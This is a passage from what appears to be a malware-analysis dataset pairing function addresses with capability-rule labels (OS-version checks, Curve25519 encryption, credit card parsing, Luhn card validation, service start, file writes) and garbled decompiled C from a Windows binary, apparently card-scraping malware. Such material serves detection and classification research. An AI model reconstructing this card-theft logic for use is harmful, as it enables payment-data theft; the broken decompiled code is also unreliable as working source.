* -0x31;\n                    pcVar9[-0x17970fab] = pcVar9[-0x17970fab] ^ extraout_ECX;\n                    iVar4 = *piVar6;\n                    puVar1 = (uVar14 >> 0x20) + -1;\n                    uVar3 = *puVar1;\n                    uVar8 = uVar14 >> 0x20;\n                    *puVar1 = *puVar1 + uVar8;\n                    pcVar7 = sym.imp.KERNEL32.dll_WaitForSingleObject + piVar6 + CARRY1(uVar3, uVar8) + iVar4;\n                }\n                if (pcVar7 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(*(puVar10 + -0x10), 1, uVar15);\n                }\n                pcVar7 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(*(puVar10 + -0xc));\n                (*pcVar7)(*(puVar10 + -0x10));\n                iVar4 = *(puVar10 + -0x14);\n                *(puVar10 + -0x14) = iVar4 + 1;\n            } while (iVar4 + 1 < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1610
    },
    "00403ac0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid fcn.00403ac0(void)\n\n{\n    uint uVar1;\n    \n    if (*0x4236f4 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x4236f4 = 1;\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "004041a0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.004041a0(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.004046e0(0x80000002, 0x411428, 0x411474, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "00402ef0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402e74) overlaps instruction at (ram,0x00402e73)\n// \n// WARNING: Removing unreachable block (ram,0x00402f5d)\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00402ef0(uint param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    uchar *puVar2;\n    char cVar3;\n    uint uVar4;\n    uint8_t uVar5;\n    code *pcVar6;\n    int32_t *piVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t **extraout_ECX;\n    uint8_t uVar10;\n    code *unaff_EBX;\n    uchar *puVar11;\n    uint unaff_EBP;\n    uint *unaff_ESI;\n    uint *puVar12;\n    uint unaff_EDI;\n    char *pcVar13;\n    ushort in_SS;\n    bool bVar14;\n    uchar uVar15;\n    ulong uVar16;\n    uint unaff_retaddr;\n    uint var_15ch;\n    uint var_58h;\n    uchar uVar17;\n    code *pcStack58;\n    uint uStack54;\n    uchar auStack50 [2];\n    uint var_2ch;\n    uint var_28h;\n    uchar uStack40;\n    uchar uStack39;\n    ushort uStack38;\n    ushort uStack36;\n    ushort uStack34;\n    ushort uStack32;\n    ushort uStack30;\n    ushort uStack28;\n    ushort uStack26;\n    uint var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar11 = &stack0xfffffffc;\n    var_8h._0_2_ = unaff_EDI;\n    var_8h._2_2_ = unaff_EDI >> 0x10;\n    var_4h._0_2_ = 0;\n    var_4h._2_2_ = 0;\n    var_ch._0_2_ = SUB42(&fcn.00402ef0::var_4h, 0);\n    var_ch._2_2_ = &fcn.00402ef0::var_4h >> 0x10;\n    hProcess._0_2_ = 0x2f0c;\n    hProcess._2_2_ = 0x40;\n    uVar8 = fcn.004040a0(&fcn.00402ef0::var_4h, unaff_EDI, 0, unaff_EBP, unaff_retaddr, param_1, param_2);\n    bVar14 = (POPCOUNT(uVar8 & 0xff) & 1U) == 0;\n    if (uVar8 == 0) {\n        return NULL;\n    }\n    if (!bVar14) {\n        var_ch._0_2_ = uVar8;\n        var_ch._2_2_ = uVar8 >> 0x10;\n        if (bVar14) {\n            segment(in_SS, *0x10 + -0xc);\n            if (bVar14) {\n                do {\n                    piVar7 = *(puVar11 + -0x14) + 1;\n                    *(puVar11 + -0x14) = piVar7;\n                    if (0 < piVar7) {\n                        return piVar7;\n                    }\n                    puVar12 = puVar11 + -0x58;\n                    for (iVar9 = 0x11; iVar9 != 0; iVar9 = iVar9 + -1) {\n                        *puVar12 = 0;\n                        puVar12 = puVar12 + 1;\n                    }\n                    *(puVar11 + -0x28) = 0;\n                    *(puVar11 + -0x10) = 0;\n                    *(puVar11 + -0xc) = 0;\n                    *(puVar11 + -0x58) = 0x44;\n                    *(puVar11 + -8) = 0;\n                    *(puVar11 + -0x2c) = 1;\n                    *(puVar11 + -4) = 0;\n                    var_8h._2_2_ = SUB42(puVar11 + -0x10, 0);\n                    var_4h._0_2_ = puVar11 + -0x10 >> 0x10;\n                    var_ch._2_2_ = SUB42(puVar11 + -0x58, 0);\n                    var_8h._0_2_ = puVar11 + -0x58 >> 0x10;\n                    hProcess._2_2_ = 0;\n                    var_ch._0_2_ = 0;\n                    var_14h._2_2_ = 0;\n                    hProcess._0_2_ = 0;\n                    uStack26 = 0;\n                    var_14h._0_2_ = 0;\n                    uStack30 = 0;\n                    uStack28 = 0;\n                    uStack34 = 0;\n                    uStack32 = 0;\n                    uStack38 = 0;\n                    uStack36 = 0;\n                    puVar2 = puVar11 + -0x15c;\n                    var_28h._2_2_ = SUB42(puVar2, 0);\n                    uStack40 = puVar2 >> 0x10;\n                    uStack39 = puVar2 >> 0x18;\n                    stack0xffffffd2 = 0;\n                    _auStack50 = 0x402e22;\n                    iVar9 = (*_sym.imp.KERNEL32.dll_CreateProcessA)();\n                    uVar15 = iVar9 == 0;\n                    if (uVar15) {\n                        return NULL;\n                    }\n                    if (uVar15) {\ncode_r0x00402e44:\n                        _auStack50 = 3000;\n                        uStack54 = 0x402e4b;\n                        (*unaff_ESI)();\n                    }\n                    else {\n                        if (!uVar15) goto code_r0x00402e44;\n                        uVar15 = 1;\n                        *puVar12 = *unaff_ESI;\n                        unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n                        puVar11 = 0x68e181d0;\n                        unaff_ESI = unaff_ESI + 1;\n                        puVar12 = puVar12 + 1;\n                    }\n                    uStack54 = *(puVar11 + -8);\n                    pcStack58 = fcn.00402ba0;\n                    uVar16 = (*unaff_EBX)();\n                    if ((uVar15) || (uVar17 = puVar12 >> 0x18,  !uVar15)) {\n                        uVar17 = 0;\n                        pcVar6 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n                    }\n                    else {\n                        uVar4 = in(uVar16 >> 0x20);\n                        *puVar12 = uVar4;\n                        if (&stack0xffffffc6 < 1) {\n                            piVar7 = *extraout_ECX;\n                            if (piVar7 != NULL) {\n                                piVar7 = (**(*piVar7 + 8))(piVar7);\n                            }\n                            return piVar7;\n                        }\n                        uVar8 = uVar16 ^ 0xdee0ed6d;\n                        piVar7 = uVar8 & 0xffff0000 | uVar8 + (uVar8 >> 8) * -0x31;\n                        unaff_EBX[-0x17970fab] = unaff_EBX[-0x17970fab] ^ extraout_ECX;\n                        iVar9 = *piVar7;\n                        puVar1 = (uVar16 >> 0x20) + -1;\n                        uVar5 = *puVar1;\n                        uVar10 = uVar16 >> 0x20;\n                        *puVar1 = *puVar1 + uVar10;\n                        pcVar6 = sym.imp.KERNEL32.dll_WaitForSingleObject + piVar7 + CARRY1(uVar5, uVar10) + iVar9;\n                    }\n                    if (pcVar6 == 0x102) {\n                        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*(puVar11 + -0x10), 1, uVar17);\n                    }\n                    pcVar6 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(*(puVar11 + -0xc));\n                    (*pcVar6)(*(puVar11 + -0x10));\n                } while( true );\n            }\n            var_8h._0_2_ = 0x9ea5;\n            var_8h._2_2_ = 0xb7bc;\n        }\n    }\n    if (CONCAT22(var_4h._2_2_, var_4h) == 0) {\n        return NULL;\n    }\n    uVar8 = 0xffffffff;\n    pcVar13 = CONCAT22(var_4h._2_2_, var_4h);\n    do {\n        if (uVar8 == 0) break;\n        uVar8 = uVar8 - 1;\n        cVar3 = *pcVar13;\n        pcVar13 = pcVar13 + 1;\n    } while (cVar3 != '\\0');\n    var_ch._0_2_ = ~uVar8 - 1;\n    var_ch._2_2_ = ~uVar8 - 1 >> 0x10;\n    hProcess._0_2_ = var_4h;\n    hProcess._2_2_ = var_4h._2_2_;\n    var_14h._0_2_ = 1;\n    var_14h._2_2_ = 0;\n    uStack28 = 0x1468;\n    uStack26 = 0x41;\n    uStack32 = 0x1428;\n    uStack30 = 0x41;\n    uStack36 = 2;\n    uStack34 = 0x8000;\n    uStack40 = 0x8d;\n    uStack39 = 0x2f;\n    uStack38 = 0x40;\n    iVar9 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)();\n    return iVar9 == 0;\n}\n",
        "token_count": 2342
    },
    "004039b0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004039f9) overlaps instruction at (ram,0x004039f5)\n// \n\nvoid __cdecl fcn.004039b0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint extraout_EDX;\n    uint arg_ch_00;\n    uint16_t unaff_BX;\n    uint16_t unaff_SI;\n    uint *puVar2;\n    bool bVar3;\n    char cVar4;\n    char cVar5;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    cVar5 = '\\0';\n    cVar4 = '\\0';\n    bVar3 = (((unaff_BX ^ unaff_SI) >> 8) - 1U & 0xd) == 0;\n    fcn.004037c0(&var_68h, &var_4h);\n    arg_ch_00 = var_4h;\n    if ((!bVar3 && cVar5 == cVar4) && (bVar3 || cVar5 != cVar4)) {\n        arg_ch_00 = extraout_EDX;\n    }\n    fcn.00403350(&var_68h, arg_ch_00, 0x407020, 0xa240);\n    *arg_8h = 0x407020;\n    *arg_ch = 0xa240;\n    return;\n}\n",
        "token_count": 418
    },
    "004046e0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404799)\n// WARNING: Removing unreachable block (ram,0x004047b2)\n// WARNING: Removing unreachable block (ram,0x004047b7)\n// WARNING: Removing unreachable block (ram,0x004047c8)\n// WARNING: Removing unreachable block (ram,0x004047d4)\n\nuint fcn.004046e0(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint extraout_ECX;\n    uint uVar4;\n    ushort in_SS;\n    bool bVar5;\n    uint uVar6;\n    uint uStack8;\n    \n    uVar4 = 1;\n    do {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(param_1, param_2, 0, 0xf003f, &uStack8);\n        if (iVar2 != 0) {\n            return 0;\n        }\n        uVar6 = uStack8;\n        uVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(uStack8, param_3, 0, param_4, param_5, param_6);\n        uVar1 = POPCOUNT(uVar3 & 0xff) & 1;\n        if (uVar3 != 0) {\n            uVar4 = 0;\n            uVar1 = 0;\n        }\n        bVar5 = uVar1 == 0;\n        if ((bVar5) || (!bVar5)) goto code_r0x00404778;\n        segment(in_SS, *0x10 + -0x3c);\n        param_2 = extraout_ECX;\n    } while (bVar5);\n    uVar6 = 0xb7bc9ea5;\ncode_r0x00404778:\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uStack8, uVar6);\n    return uVar4;\n}\n",
        "token_count": 467
    },
    "00403a30": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403a30(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_ch == 1) {\n        fcn.00401440();\n        fcn.00404500();\n        fcn.00402ca0();\n        if (*0x4236ec == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00404820();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)();\n    return;\n}\n",
        "token_count": 127
    },
    "00404b30": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404ca2) overlaps instruction at (ram,0x00404c9d)\n// \n// WARNING: Control flow encountered bad instruction data\n\nvoid __fastcall fcn.00404b30(int32_t *param_1, int32_t param_2, uint32_t *param_3)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint in_EAX;\n    uint *puVar3;\n    uint8_t uVar4;\n    int32_t unaff_EBX;\n    uint32_t uVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    uint32_t unaff_ESI;\n    uint32_t *puVar8;\n    ushort in_SS;\n    bool bVar9;\n    uint8_t in_AF;\n    bool bVar10;\n    bool bVar11;\n    bool bVar12;\n    bool bVar13;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    ushort uStack28;\n    \n    puVar7 = &stack0xfffffffc;\n    *param_3 = 0xfa;\n    bVar12 = SBORROW4(unaff_ESI | 0x561b, param_2);\n    bVar11 = (unaff_ESI | 0x561b) - param_2 < 0;\n    puVar3 = CONCAT31(in_EAX >> 8, 0xe8);\n    *(param_3 + 1) = 0xe8;\n    puVar6 = &stack0xfffffffc;\n    puVar8 = param_3;\n    if (bVar12) goto code_r0x00404ba0;\n    puVar6 = &stack0xfffffffc;\n    if (!bVar12) goto code_r0x00404ba0;\ncode_r0x00404b8f:\n    LOCK();\n    puVar3 = puVar3 + 0x658f517f;\n    bVar11 = puVar3 < 0;\n    puVar6 = puVar7;\n    puVar8 = param_3;\ncode_r0x00404ba0:\n    *(puVar8 + 2) = puVar3;\n    if ((!bVar11) && (bVar11)) {\n        *(puVar8 + 7) = in_ST0;\n        puVar8 = puVar8 + 5;\n        in_ST0 = in_ST1;\n        in_ST1 = in_ST2;\n        in_ST2 = in_ST3;\n        in_ST3 = in_ST4;\n        in_ST4 = in_ST5;\n        in_ST5 = in_ST6;\n        in_ST6 = in_ST7;\n    }\n    *(puVar8 + 3) = 0x38;\n    *(puVar8 + 1) = 0x48;\n    puVar7 = puVar6;\ncode_r0x00404bd3:\n    uStack28 = param_2;\n    bVar12 = false;\n    uVar2 = *(puVar7 + 8);\n    *(uVar2 + 5) = 0x48;\n    bVar13 = SCARRY4(unaff_EBX, 1);\n    uVar5 = unaff_EBX + 1;\n    bVar11 = uVar5 < 0;\n    bVar10 = uVar5 == 0;\n    bVar9 = (POPCOUNT(uVar5 & 0xff) & 1U) == 0;\n    *(uVar2 + 6) = 0x29;\n    uVar5 = uVar2;\n    if ((!bVar9) && (bVar9)) {\n        uVar5 = *puVar8;\n        *puVar8 = uVar2;\n        bVar11 = puVar7 < *(puVar7 + 0x5f9dff63);\n        puVar7 = puVar7 + -*(puVar7 + 0x5f9dff63);\n        if (puVar7 < 0) {\n            *param_1 = *param_1 + -0x44000000 + bVar11;\n            param_3 = puVar8 + 1;\n            uVar2 = in(uStack28);\n            *puVar8 = uVar2;\n            goto code_r0x00404b8f;\n        }\n        bVar12 = false;\n        bVar13 = false;\n        bVar11 = uVar5 < 0;\n        bVar10 = uVar5 == 0;\n        bVar9 = (POPCOUNT(uVar5 & 0xff) & 1U) == 0;\n        if (!bVar11) {\n            *puVar3 = *puVar3 + puVar3;\n            *(puVar3 + 0x66) = *(puVar3 + 0x66) + param_2;\n            puVar3 = 0xf58ea42;\n            *0xf58ea42 = *0xf58ea42 + 'B';\n            puVar1 = puVar8 + 0x16;\n            bVar12 = 0x15 < *puVar1;\n            bVar13 = SCARRY1(*puVar1, -0x16);\n            *puVar1 = *puVar1 + -0x16;\n            uVar4 = *puVar1;\n            bVar9 = (POPCOUNT(*puVar1) & 1U) == 0;\n            goto code_r0x00404c77;\n        }\n    }\n    do {\n        *(uVar5 + 7) = 0x96;\n        if ((!bVar10 && bVar13 == bVar11) && (bVar10 || bVar13 != bVar11)) {\n            in_AF = 9 < (puVar3 & 0xf) | in_AF;\n            puVar3 = puVar3 & 0xffff0000 | CONCAT11((puVar3 >> 8) + in_AF, puVar3 + in_AF * '\\x06') & 0xff0f;\n            puVar6 = puVar7;\n            if (param_1 != NULL) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            goto code_r0x00404ba0;\n        }\n        *(uVar5 + 8) = 0x11;\n        if ((!bVar9) && (bVar9)) {\n            puVar3 = segment(in_SS, *0x10 + -0x10);\n            puVar3 = *puVar3;\n            param_2 = -0x4843615b;\n            if (bVar12) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            if (bVar9) goto code_r0x00404bd3;\n        }\n        *(uVar5 + 9) = 0x85;\n        bVar12 = false;\n        bVar13 = false;\n        uVar4 = param_2 ^ unaff_EBX >> 8 | 0x67;\n        bVar9 = (POPCOUNT(uVar4) & 1U) == 0;\n        *(uVar5 + 10) = 0xeb;\n        if ((bVar9) || (!bVar9)) goto code_r0x00404c87;\n        puVar3 = segment(in_SS, *0x10 + -0x10);\n        puVar3 = *puVar3;\ncode_r0x00404c77:\n        bVar11 = uVar4 < '\\0';\n        bVar10 = uVar4 == 0;\n        param_2 = -0x4843615b;\n        if (bVar12) goto code_r0x00404ca8;\n        if (!bVar9) {\ncode_r0x00404c87:\n            *(uVar5 + 0xb) = 0x23;\n            puVar3 = param_2 + 1U | 0x5f;\ncode_r0x00404ca8:\n            *puVar3 = 0xc;\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 1808
    },
    "004043c0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004043c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    code *pcVar3;\n    uchar uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint8_t extraout_DL;\n    uint *puVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint *puVar10;\n    uint *puVar11;\n    bool bVar12;\n    bool bVar13;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar14;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    bVar14 = false;\n    puVar7 = &stack0xfffffffc;\n    var_4h = fcn.004023e0(arg_18h, arg_1ch, 0x4112a4, 7);\n    pcVar3 = _sym.imp.MSVCRT.dll_rand;\n    if (var_4h == NULL) {\n        return 0;\n    }\n    var_24h = 0;\n    puVar10 = &var_23h;\n    for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    bVar13 = false;\n    bVar12 = true;\n    uVar8 = 0;\n    do {\n        if ((!bVar12) && (bVar12)) {\n            uVar9 = bVar14 * 0x400 | (in_IF & 1) * 0x200;\n            uVar1 = uVar9 | (in_TF & 1) * 0x100;\n            bVar14 = (uVar9 & 0x400) != 0;\n            in_IF = (uVar1 & 0x200) != 0;\n            in_TF = ((uVar1 | bVar13 * 0x80) & 0x100) != 0;\n        }\n        uVar4 = (*pcVar3)();\n        (&var_24h)[uVar8] = uVar4;\n        uVar9 = uVar8 + 1;\n        bVar13 = uVar8 - 0x1f < 0;\n        bVar12 = uVar8 == 0x1f;\n        uVar8 = uVar9;\n    } while (uVar9 < 0x20);\n    puVar10 = &var_24h;\n    puVar11 = var_4h;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar11 = *puVar10;\n        puVar10 = puVar10 + bVar14 * -2 + 1;\n        puVar11 = puVar11 + bVar14 * -2 + 1;\n    }\n    bVar14 = (POPCOUNT(extraout_DL | 0x1f) & 1U) == 0;\n    fcn.004041f0();\n    if ((!bVar14) && (bVar14)) {\n        puVar10 = &stack0xffffffac;\n        cVar2 = '\\x1e';\n        do {\n            puVar7 = puVar7 + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *puVar7;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n        uVar5 = in(0x78);\n        return uVar5;\n    }\n    fcn.00404790(arg_18h, arg_1ch);\n    return 1;\n}\n",
        "token_count": 899
    },
    "00404d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00404d80(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00403a30;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x40701c;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 219
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401000(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    // [00] -r-x section size 20480 named .text\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 258
    },
    "00401090": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004010ca) overlaps instruction at (ram,0x004010c5)\n// \n\nuint __cdecl fcn.00401090(uint filename, uint mode, uint ptr, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.MSVCRT.dll_fopen)(filename);\n    if (iVar2 != 0) {\n        iVar3 = *0x8b17b43a;\n        (*_sym.imp.MSVCRT.dll_fwrite)(*(iVar3 + 0x10), 1, iVar2, iVar3);\n        uVar1 = *(iVar3 + 0xc);\n        (*_sym.imp.MSVCRT.dll_fflush)(uVar1);\n        (*_sym.imp.MSVCRT.dll_fclose)(uVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 209
    },
    "004011c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004011ce) overlaps instruction at (ram,0x004011cc)\n// \n\nvoid __cdecl fcn.004011c0(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    char in_CH;\n    char *in_EDX;\n    char in_SF;\n    char in_OF;\n    \n    if ((in_OF != in_SF) || (in_OF == in_SF)) {\n        in_EAX = arg_8h;\n    }\n    in_EDX[-0x80] = in_EDX[-0x80] + in_CH;\n    *in_EDX = *in_EDX + in_EDX;\n    *(in_EAX + 3) = *(in_EAX + 3) + in_CH;\n    (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    return;\n}\n",
        "token_count": 185
    },
    "004023e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar * __cdecl fcn.004023e0(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar1 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h == 0) {\n        return arg_8h;\n    }\n    if (arg_8h <= pcVar1) {\n        do {\n            if (*arg_8h == *arg_10h) {\n                bVar5 = true;\n                iVar2 = arg_14h;\n                pcVar3 = arg_8h;\n                pcVar4 = arg_10h;\n                do {\n                    pcVar4 = pcVar4 + 1;\n                    pcVar3 = pcVar3 + 1;\n                    iVar2 = iVar2 + -1;\n                    if (iVar2 == 0) break;\n                    bVar5 = *pcVar3 == *pcVar4;\n                } while (bVar5);\n                if (bVar5) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h <= pcVar1);\n    }\n    return NULL;\n}\n",
        "token_count": 322
    },
    "00402480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402480(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "004025a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004025c8) overlaps instruction at (ram,0x004025c3)\n// \n\nbool fcn.004025a0(uint param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint8_t extraout_CL;\n    uint *unaff_ESI;\n    uint32_t unaff_EDI;\n    bool bVar3;\n    unkbyte6 Var4;\n    uint uStack40;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack40 = param_1;\n    Var4 = (*_sym.imp.MSVCRT.dll__strlwr)();\n    bVar3 = 0xfffffffb < &uStack40;\n    if ((*0x10 != 0x24 && SCARRY4(&uStack40, 4) == &stack0xffffffdc < 0) &&\n       (*0x10 == 0x24 || SCARRY4(&uStack40, 4) != &stack0xffffffdc < 0)) {\n        puVar1 = Var4 + -0x38c625aa;\n        *puVar1 = *puVar1 ^ extraout_CL;\n        in(Var4 >> 0x20);\n        LOCK();\n        *unaff_ESI = Var4 >> 0x20;\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uStack24 = 0x411690;\n    uStack20 = 0x411688;\n    uStack16 = 0x411698;\n    uStack12 = 0x4116a0;\n    uStack8 = 0x4116a8;\n    if (bVar3) {\ncode_r0x004025fc:\n        unaff_EDI = 0;\n        unaff_ESI = &uStack24;\n    }\n    else {\n        do {\n            if (!bVar3) goto code_r0x004025fc;\n            bVar3 = false;\n            unaff_EDI = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n        } while (unaff_EDI != 0);\n    }\n    do {\n        uStack40 = *unaff_ESI;\n        iVar2 = (*_sym.imp.MSVCRT.dll_strstr)();\n        if (iVar2 != 0) {\n            return true;\n        }\n        unaff_EDI = unaff_EDI + 1;\n        unaff_ESI = unaff_ESI + 1;\n    } while (unaff_EDI < 5);\n    uStack40 = 0x411680;\n    iVar2 = (*_sym.imp.MSVCRT.dll_strstr)();\n    return iVar2 == 0;\n}\n",
        "token_count": 613
    },
    "00402660": {
        "rules": [
